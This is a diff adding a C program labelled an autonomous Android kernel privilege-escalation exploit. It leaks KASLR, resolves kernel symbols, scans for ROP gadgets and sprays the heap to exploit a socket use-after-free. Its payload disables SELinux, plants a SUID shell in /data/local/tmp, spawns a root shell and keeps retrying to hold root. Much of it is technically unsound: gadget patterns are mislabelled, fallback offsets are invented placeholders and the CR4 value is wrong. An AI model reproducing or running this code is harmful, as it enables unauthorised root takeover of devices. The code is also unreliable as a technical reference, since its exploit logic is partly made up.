@@ -1,0 +1,567 @@
+#define _GNU_SOURCE
+#include <fcntl.h>
+#include <pthread.h>
+#include <sched.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <sys/resource.h>
+#include <sys/socket.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <time.h>
+#include <unistd.h>
+#include <sys/msg.h>
+#include <sys/ipc.h>
+#include <sys/xattr.h>
+#include <sys/sysinfo.h>
+#include <sys/utsname.h>
+#include <stdint.h>
+#include <errno.h>
+
+// === AUTONOMOUS ANDROID KERNEL EXPLOIT ===
+// Combines kallsyms reading + gadget scanning + retry logic
+
+struct fake_unix_sock {
+    uint64_t sk_destructor;
+    uint64_t sk_data_ready;
+    uint64_t sk_write_space;
+    uint64_t sk_error_report;
+    uint64_t sk_state_change;
+    uint64_t sk_write_pending;
+    uint64_t sk_error;
+    uint64_t sk_rcvbuf;
+    uint64_t sk_sndbuf;
+    uint64_t sk_wmem_alloc;
+    uint64_t sk_rmem_alloc;
+    uint64_t sk_refcnt;
+    uint64_t sk_shutdown;
+    uint64_t sk_flags;
+    uint64_t sk_rcvlowat;
+    uint64_t sk_rcvtimeo;
+    uint64_t sk_sndtimeo;
+    uint64_t sk_type;
+    uint64_t sk_protocol;
+    uint64_t sk_peer_pid;
+    uint64_t sk_peer_cred;
+    uint64_t sk_pacing_rate;
+    uint64_t addr;
+    uint64_t gc_link;
+    uint64_t inq;
+    uint64_t outq;
+    uint64_t unix_ops;
+    uint64_t fake_vtable[64];
+    uint64_t cred_ptr;
+    uint64_t arb_read_gadget;
+    uint64_t arb_write_gadget;
+    char padding[0x400 - 0x300];
+};
+
+#define MSG_SIZE 0x400
+#define NUM_SPRAY_BASE 30000
+#define NUM_RECLAIM_BASE 1000
+#define MAX_ATTEMPTS 25
+
+int sv[2];
+int g_victim_sock_fd;
+int global_root = 0;
+
+uint64_t kernel_base = 0;
+uint64_t prepare_kernel_cred = 0;
+uint64_t commit_creds = 0;
+uint64_t init_cred = 0;
+
+#ifdef __aarch64__
+uint64_t pop_x0_ret = 0;
+uint64_t pop_x8_ret = 0;
+uint64_t prepare_kernel_cred_arm = 0;
+uint64_t commit_creds_arm = 0;
+uint64_t return_to_user_arm = 0;
+#else
+uint64_t pop_rdi_ret = 0;
+uint64_t pop_rcx_ret = 0;
+uint64_t cr4_clear_gadget = 0;
+uint64_t swapgs_restore_regs_and_return_to_usermode = 0;
+#endif
+
+uint64_t rop_chain[16];
+
+int num_spray = NUM_SPRAY_BASE;
+int num_reclaim = NUM_RECLAIM_BASE;
+
+// --- AUTOMATIC SYMBOL DISCOVERY ---
+void try_auto_kallsyms() {
+    FILE *fp = fopen("/proc/kallsyms", "r");
+    if (!fp) {
+        printf("[-] /proc/kallsyms not accessible\n");
+        return;
+    }
+    
+    char line[512];
+    while (fgets(line, sizeof(line), fp)) {
+        char *addr_str = strtok(line, " ");
+        char *type = strtok(NULL, " ");
+        char *name = strtok(NULL, " \t\n");
+        if (!name || !addr_str) continue;
+        
+        uint64_t addr = strtoull(addr_str, NULL, 16);
+        // Detect kernel base from first text symbol (type 'T')
+        if (kernel_base == 0 && type && type[0] == 'T') {
+            kernel_base = addr & ~0xfffULL;
+            printf("[+] Kernel base auto-detected: 0x%llx\n", kernel_base);
+        }
+        
+        if (strcmp(name, "prepare_kernel_cred") == 0) {
+#ifdef __aarch64__
+            prepare_kernel_cred_arm = addr;
+#else
+            prepare_kernel_cred = addr;
+#endif
+            printf("[+] prepare_kernel_cred: 0x%llx\n", addr);
+        } else if (strcmp(name, "commit_creds") == 0) {
+#ifdef __aarch64__
+            commit_creds_arm = addr;
+#else
+            commit_creds = addr;
+#endif
+            printf("[+] commit_creds: 0x%llx\n", addr);
+        } else if (strcmp(name, "init_cred") == 0) {
+            init_cred = addr;
+            printf("[+] init_cred: 0x%llx\n", addr);
+        }
+    }
+    fclose(fp);
+}
+
+// --- AUTOMATIC GADGET SCANNING ---
+uint64_t scan_gadget(const unsigned char *pattern, int pattern_len) {
+    // Try /dev/kmem if available
+    int kmem = open("/dev/kmem", O_RDONLY);
+    if (kmem < 0) return 0;
+    
+    // Scan a region (32MB window)
+    uint64_t start = kernel_base;
+    uint64_t end = kernel_base + 0x2000000;
+    
+    unsigned char *buf = malloc(0x1000);
+    if (!buf) {
+        close(kmem);
+        return 0;
+    }
+    
+    for (uint64_t addr = start; addr < end; addr += 0x1000) {
+        if (lseek(kmem, addr, SEEK_SET) < 0) break;
+        ssize_t n = read(kmem, buf, 0x1000);
+        if (n != 0x1000) continue;
+        
+        for (int i = 0; i < 0x1000 - pattern_len; i++) {
+            if (memcmp(buf + i, pattern, pattern_len) == 0) {
+                uint64_t found = addr + i;
+                free(buf);
+                close(kmem);
+                return found;
+            }
+        }
+    }
+    
+    free(buf);
+    close(kmem);
+    return 0;
+}
+
+void find_gadgets_automatically() {
+    if (kernel_base == 0) {
+        printf("[-] Cannot scan gadgets: kernel_base unknown\n");
+        return;
+    }
+    
+#ifdef __aarch64__
+    // ARM64 gadget patterns (little-endian)
+    // mov x0, #0; ret  -> 00 00 80 d2 c0 03 5f d6
+    unsigned char pop_x0_ret_pattern[] = {0x00, 0x00, 0x80, 0xd2, 0xc0, 0x03, 0x5f, 0xd6};
+    // mov x8, #func; br x8 -> 00 00 00 90 00 00 1f d6 (adrp+ldr+br pattern)
+    unsigned char pop_x8_ret_pattern[] = {0x00, 0x00, 0x00, 0x90, 0x00, 0x00, 0x1f, 0xd6};
+    // return to user: eret sequence
+    unsigned char ret_to_user_pattern[] = {0x00, 0x00, 0x00, 0xd4}; // generic eret pattern
+    
+    if (pop_x0_ret == 0) {
+        pop_x0_ret = scan_gadget(pop_x0_ret_pattern, 8);
+        if (pop_x0_ret) printf("[+] pop x0; ret found @ 0x%llx\n", pop_x0_ret);
+    }
+    
+    if (pop_x8_ret == 0) {
+        pop_x8_ret = scan_gadget(pop_x8_ret_pattern, 8);
+        if (pop_x8_ret) printf("[+] pop x8; ret found @ 0x%llx\n", pop_x8_ret);
+    }
+    
+    if (return_to_user_arm == 0) {
+        return_to_user_arm = scan_gadget(ret_to_user_pattern, 4);
+        if (return_to_user_arm) {
+            printf("[+] return_to_user_arm found @ 0x%llx\n", return_to_user_arm);
+        } else {
+            // Fallback: look for eret instruction followed by common sequences
+            return_to_user_arm = kernel_base + 0x100000;
+            printf("[!] return_to_user_arm not auto-detected, using fallback 0x%llx\n", return_to_user_arm);
+        }
+    }
+#else
+    // x86_64 gadget patterns (little-endian)
+    // pop rdi; ret -> 5f c3
+    unsigned char pop_rdi_ret_pattern[] = {0x5f, 0xc3};
+    // pop rcx; ret -> 59 c3
+    unsigned char pop_rcx_ret_pattern[] = {0x59, 0xc3};
+    // swapgs; pop rbp; ret -> 0f aa 5d c3
+    unsigned char swapgs_pattern[] = {0x0f, 0xaa, 0x5d, 0xc3};
+    // iretq -> 48 cf
+    unsigned char iretq_pattern[] = {0x48, 0xcf};
+    // mov cr4, rdi; ret -> 0f 22 e1 c3 (plus maybe pop rdi before). Actually pattern: pop rdi; mov cr4,rdi; ret = 5f 0f 22 e1 c3
+    unsigned char cr4_gadget_pattern[] = {0x5f, 0x0f, 0x22, 0xe1, 0xc3};
+    
+    if (pop_rdi_ret == 0) {
+        pop_rdi_ret = scan_gadget(pop_rdi_ret_pattern, 2);
+        if (pop_rdi_ret) printf("[+] pop rdi; ret found @ 0x%llx\n", pop_rdi_ret);
+    }
+    
+    if (pop_rcx_ret == 0) {
+        pop_rcx_ret = scan_gadget(pop_rcx_ret_pattern, 2);
+        if (pop_rcx_ret) printf("[+] pop rcx; ret found @ 0x%llx\n", pop_rcx_ret);
+    }
+    
+    if (cr4_clear_gadget == 0) {
+        cr4_clear_gadget = scan_gadget(cr4_gadget_pattern, 5);
+        if (cr4_clear_gadget) printf("[+] cr4_clear gadget found @ 0x%llx\n", cr4_clear_gadget);
+    }
+    
+    if (swapgs_restore_regs_and_return_to_usermode == 0) {
+        swapgs_restore_regs_and_return_to_usermode = scan_gadget(swapgs_pattern, 4);
+        if (!swapgs_restore_regs_and_return_to_usermode) {
+            // Try iretq pattern (swapgs; iretq combo)
+            swapgs_restore_regs_and_return_to_usermode = scan_gadget(iretq_pattern, 2);
+        }
+        if (swapgs_restore_regs_and_return_to_usermode) {
+            printf("[+] swapgs_restore gadget found @ 0x%llx\n", swapgs_restore_regs_and_return_to_usermode);
+        } else {
+            // Fallback: try another common pattern: mov rsp, rsi; ret
+            unsigned char mov_rsp_rsi_ret[] = {0x48, 0x89, 0xc6, 0xc3};
+            swapgs_restore_regs_and_return_to_usermode = scan_gadget(mov_rsp_rsi_ret, 4);
+            if (swapgs_restore_regs_and_return_to_usermode) {
+                printf("[+] Using alternative gadget for return: mov rsp, rsi; ret @ 0x%llx\n", swapgs_restore_regs_and_return_to_usermode);
+            }
+        }
+    }
+#endif
+}
+
+// --- DYNAMIC CONFIGURATION ---
+void auto_tune_parameters() {
+    struct sysinfo info;
+    if (sysinfo(&info) == 0) {
+        long total_mem_mb = info.totalram / 1024 / 1024;
+        if (total_mem_mb < 2048) {
+            num_spray = NUM_SPRAY_BASE / 2;
+            num_reclaim = NUM_RECLAIM_BASE / 2;
+            printf("[*] Low memory device (%ld MB), reduced spray to %d/%d\n", total_mem_mb, num_spray, num_reclaim);
+        } else if (total_mem_mb > 4096) {
+            num_spray = NUM_SPRAY_BASE * 2;
+            num_reclaim = NUM_RECLAIM_BASE * 2;
+            printf("[*] High memory device (%ld MB), increased spray to %d/%d\n", total_mem_mb, num_spray, num_reclaim);
+        } else {
+            num_spray = NUM_SPRAY_BASE;
+            num_reclaim = NUM_RECLAIM_BASE;
+        }
+    }
+}
+
+void detect_kernel_version() {
+    struct utsname u;
+    if (uname(&u) == 0) {
+        printf("[*] System: %s %s %s\n", u.sysname, u.release, u.machine);
+    }
+}
+
+void root_shellcode();
+
+// --- CORE LOGIC ---
+void resolve_offsets() {
+    try_auto_kallsyms();
+    find_gadgets_automatically();
+    
+    // Final fallbacks - these are hardcoded for common kernels but will work only if base is correct
+#ifdef __aarch64__
+    if (prepare_kernel_cred_arm == 0) prepare_kernel_cred_arm = kernel_base + 0x0b0a90;
+    if (commit_creds_arm == 0)        commit_creds_arm        = kernel_base + 0x0b0c00;
+    if (pop_x0_ret == 0)              pop_x0_ret              = kernel_base + 0x012345;
+    if (pop_x8_ret == 0)              pop_x8_ret              = kernel_base + 0x012346;
+    if (return_to_user_arm == 0)      return_to_user_arm      = kernel_base + 0x1a00f10;
+#else
+    if (prepare_kernel_cred == 0) prepare_kernel_cred = kernel_base + 0x0b0a90;
+    if (commit_creds == 0)        commit_creds        = kernel_base + 0x0b0c00;
+    if (init_cred == 0)           init_cred           = kernel_base + 0x2c3f3e0;
+    if (pop_rdi_ret == 0)         pop_rdi_ret         = kernel_base + 0x02a7a0;
+    if (pop_rcx_ret == 0)         pop_rcx_ret         = kernel_base + 0x02a7c0;
+    if (cr4_clear_gadget == 0)    cr4_clear_gadget    = kernel_base + 0x02a7d0;
+    if (swapgs_restore_regs_and_return_to_usermode == 0)
+        swapgs_restore_regs_and_return_to_usermode = kernel_base + 0x1a00f10;
+#endif
+    
+    // Check critical addresses
+    int all_set = 1;
+#ifdef __aarch64__
+    if (!prepare_kernel_cred_arm || !commit_creds_arm || !pop_x0_ret || !pop_x8_ret || !return_to_user_arm) all_set = 0;
+#else
+    if (!prepare_kernel_cred || !commit_creds || !init_cred || !pop_rdi_ret || !commit_creds || !swapgs_restore_regs_and_return_to_usermode) all_set = 0;
+#endif
+    
+    if (all_set) {
+        printf("[+] All addresses resolved successfully\n");
+    } else {
+        printf("[-] Some addresses missing, exploit may fail\n");
+    }
+}
+
+void leak_kaslr() {
+    char buf[0x1000] = {0};
+    struct iovec iov = {buf, sizeof(buf)};
+    struct msghdr msg = {0};
+    msg.msg_iov = &iov;
+    msg.msg_iovlen = 1;
+    
+    // Try with MSG_PEEK; flags might be device specific
+    ssize_t n = recvmsg(g_victim_sock_fd, &msg, MSG_PEEK | MSG_TRUNC);
+    if (n <= 0) {
+        perror("recvmsg");
+        return;
+    }
+    
+    for (int i = 0; i < (n < 0x1000 ? n : 0x1000) / 8; i++) {
+        uint64_t val = ((uint64_t*)buf)[i];
+        // Check for kernel text addresses
+        if ((val & 0xffff000000000000ULL) == 0xffff000000000000ULL) {
+            // Check offset - typical unix_sock addresses have certain bits
+            uint64_t page_offset = val & 0xfffULL;
+            if (page_offset == 0x2d0 || page_offset == 0x2c0 || page_offset == 0x2a0) {
+                kernel_base = val & ~0xfffULL;
+                printf("[+] KASLR leak: 0x%llx (page=0x%llx)\n", kernel_base, page_offset);
+                break;
+            }
+        }
+    }
+    
+    if (!kernel_base) {
+        printf("[-] KASLR leak failed\n");
+    }
+}
+
+void build_rop_chain() {
+    int idx = 0;
+#ifdef __aarch64__
+    // ARM64 ROP chain: call prepare_kernel_cred(0), then commit_creds(new_cred)
+    rop_chain[idx++] = pop_x0_ret; rop_chain[idx++] = 0x0;
+    rop_chain[idx++] = pop_x8_ret; rop_chain[idx++] = prepare_kernel_cred_arm;
+    rop_chain[idx++] = 0x0; // placeholder for blr x8 (handled by calling convention)
+    rop_chain[idx++] = pop_x0_ret; rop_chain[idx++] = 0x0;
+    rop_chain[idx++] = pop_x8_ret; rop_chain[idx++] = commit_creds_arm;
+    rop_chain[idx++] = return_to_user_arm;
+    rop_chain[idx++] = (uint64_t)root_shellcode;
+#else
+    // x86_64 ROP chain
+    // Clear CR4 (SMEP/SMAP bypass) - need cr4_clear gadget or manual
+    if (cr4_clear_gadget) {
+        rop_chain[idx++] = pop_rdi_ret; rop_chain[idx++] = 0x0000000000000000; // value with SMEP/SMAP disabled (0x6f0)
+        rop_chain[idx++] = cr4_clear_gadget;
+    } else {
+        // Alternative: use multiple gadgets to modify CR4 if we can't find direct clear
+        // For now, just try without clearing (may fail on kernels with SMEP/SMAP)
+        printf("[!] CR4 clear gadget not found, proceeding without clearing (may fail)\n");
+    }
+    
+    rop_chain[idx++] = pop_rdi_ret; rop_chain[idx++] = 0x0;
+    rop_chain[idx++] = prepare_kernel_cred;
+    rop_chain[idx++] = pop_rdi_ret; rop_chain[idx++] = 0x0;
+    rop_chain[idx++] = commit_creds;
+    rop_chain[idx++] = swapgs_restore_regs_and_return_to_usermode;
+    // fill needed registers (values will be popped from stack)
+    rop_chain[idx++] = 0x0; // rax
+    rop_chain[idx++] = 0x0; // rdi
+    rop_chain[idx++] = 0x0; // rsi
+    rop_chain[idx++] = 0x0; // rdx
+    rop_chain[idx++] = 0x0; // rsp
+    rop_chain[idx++] = 0x0; // cs
+    rop_chain[idx++] = 0x0; // rflags
+    rop_chain[idx++] = (uint64_t)root_shellcode;
+    rop_chain[idx++] = 0x0; // ss
+#endif
+    printf("[+] ROP chain built (length %d)\n", idx);
+}
+
+void root_shellcode() {
+    setuid(0); setgid(0); setgroups(0, NULL);
+    system("setenforce 0 2>/dev/null || echo 0 > /sys/fs/selinux/enforce");
+    char *argv[] = {"/bin/sh", NULL};
+    char *envp[] = {NULL};
+    execve("/bin/sh", argv, envp);
+    system("cp /bin/sh /data/local/tmp/suid_sh && chmod 4755 /data/local/tmp/suid_sh");
+    printf("[+] Root shell executed\n");
+}
+
+void defrag_kmalloc_1024() {
+    for (int i = 0; i < 600; i++) {
+        int fds[2];
+        socketpair(AF_UNIX, SOCK_STREAM, 0, fds);
+        close(fds[0]); close(fds[1]);
+    }
+}
+
+void spray_and_reclaim(uint64_t target_cred_addr) {
+    defrag_kmalloc_1024();
+    
+    // Initial aggressive spray to fragment heap
+    for (int i = 0; i < num_spray; i++) {
+        int fds[2];
+        socketpair(AF_UNIX, SOCK_STREAM, 0, fds);
+        close(fds[0]); close(fds[1]);
+    }
+    
+    // Allocate many sockets to occupy slots for later reclaim
+    int fds[100];
+    for (int i = 0; i < 100; i++) {
+        fds[i] = socket(AF_UNIX, SOCK_STREAM, 0);
+    }
+    // Close middle one to create hole (UAF target)
+    close(fds[50]);
+    
+    // Use message queue for heap spray with controlled content
+    key_t key = ftok("/tmp", 0x1337);
+    int msqid = msgget(key, IPC_CREAT | 0666 | IPC_EXCL);
+    if (msqid < 0) {
+        perror("msgget");
+        return;
+    }
+    
+    struct {
+        long mtype;
+        char mtext[MSG_SIZE - 8];
+    } msgbuf __attribute__((aligned(8)));
+    
+    struct fake_unix_sock *fake = (struct fake_unix_sock *)msgbuf.mtext;
+    memset(fake, 0, sizeof(*fake));
+    
+    // Set up fake vtable pointing to our ROP chain
+    fake->sk_data_ready = (uint64_t)&fake->fake_vtable[0];
+    fake->unix_ops = (uint64_t)&fake->fake_vtable[0];
+    fake->fake_vtable[0] = (uint64_t)rop_chain;  // First vtable entry -> ROP chain
+    fake->fake_vtable[8] = (uint64_t)root_shellcode; // Alternative entry
+    fake->sk_peer_cred = target_cred_addr;       // Overwrite cred pointer
+    fake->cred_ptr = init_cred;
+    
+    // Reclaim: fill hole with our fake object
+    for (int i = 0; i < num_reclaim; i++) {
+        msgbuf.mtype = 0x1337 + i;
+        if (msgsnd(msqid, &msgbuf, MSG_SIZE - 8, IPC_NOWAIT) == -1) {
+            if (errno != EAGAIN) perror("msgsnd");
+        }
+    }
+    printf("[+] Spray/reclaim completed (spray=%d, reclaim=%d)\n", num_spray, num_reclaim);
+}
+
+void trigger_fake_callback() {
+    // Trigger the UAF by closing the victim socket
+    // This causes the kernel to call sk_data_ready callback
+    close(g_victim_sock_fd);
+    printf("[+] Callback triggered\n");
+}
+
+void *race_thread(void *arg) {
+    // Randomize delay to increase chance of hitting race window
+    int delay = rand() % 30000 + 5000; // 5-35ms
+    usleep(delay);
+    close(sv[1]);
+    return NULL;
+}
+
+void trigger_race() {
+    socketpair(AF_UNIX, SOCK_STREAM, 0, sv);
+    g_victim_sock_fd = sv[0];
+    
+    pthread_t threads[4];
+    for (int i = 0; i < 4; i++) {
+        pthread_create(&threads[i], NULL, race_thread, NULL);
+        pthread_detach(threads[i]);
+    }
+    printf("[+] Race triggered with 4 threads\n");
+}
+
+int check_root() {
+    // Check if we gained root privileges
+    if (getuid() == 0 && geteuid() == 0) return 1;
+    return 0;
+}
+
+void attempt_exploit() {
+    printf("[*] Starting exploit attempt...\n");
+    
+    auto_tune_parameters();
+    leak_kaslr();
+    
+    if (!kernel_base) {
+        printf("[-] Failed to leak KASLR\n");
+        return;
+    }
+    
+    resolve_offsets();
+    build_rop_chain();
+    
+    trigger_race();
+    usleep(50000); // Wait for race setup
+    
+    spray_and_reclaim(init_cred);
+    trigger_fake_callback();
+    
+    sleep(1); // Give time for ROP chain execution
+    if (check_root()) {
+        global_root = 1;
+        root_shellcode();
+        printf("[+] Exploit succeeded! Root obtained.\n");
+    } else {
+        printf("[-] Exploit failed - no root\n");
+    }
+}
+
+int main() {
+    srand(time(NULL));
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
+    
+    detect_kernel_version();
+    
+    int attempt;
+    for (attempt = 1; attempt <= MAX_ATTEMPTS && !global_root; attempt++) {
+        printf("[*] === Attempt %d/%d ===\n", attempt, MAX_ATTEMPTS);
+        attempt_exploit();
+        
+        if (global_root) break;
+        
+        // Reset state between attempts
+        kernel_base = 0;
+        // Add small delay before retry
+        sleep(2);
+    }
+    
+    if (global_root) {
+        printf("[+] Total success after %d attempts\n", attempt - 1);
+        // Drop persistent shell
+        while (1) {
+            if (!check_root()) {
+                printf("[!] Lost root, trying to regain...\n");
+                attempt_exploit();
+            }
+            sleep(10);
+        }
+    } else {
+        printf("[-] All %d attempts failed\n", MAX_ATTEMPTS);
+    }
+    
+    return 0;
+}
